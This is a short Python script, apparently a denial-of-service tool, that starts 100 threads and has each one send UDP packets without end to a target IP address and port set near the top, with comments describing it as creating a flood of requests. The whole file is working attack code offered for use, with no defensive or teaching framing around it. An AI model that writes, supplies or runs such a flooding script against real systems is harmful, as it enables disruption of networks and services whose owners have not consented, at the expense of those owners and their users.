import socket
import threading

# Target information
target_ip = "192.168.1.1"  # Replace with the target's IP address
target_port = 80            # Common port for HTTP requests

# Function to create a flood of requests
def flood():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        # Send a packet to the target IP and port
        s.sendto(b'Flooding', (target_ip, target_port))
        print(f"Packet sent to {target_ip}:{target_port}")

# Number of threads to launch
num_threads = 100

# Start multiple threads to flood the target
for _ in range(num_threads):
    thread = threading.Thread(target=flood)
    thread.start()
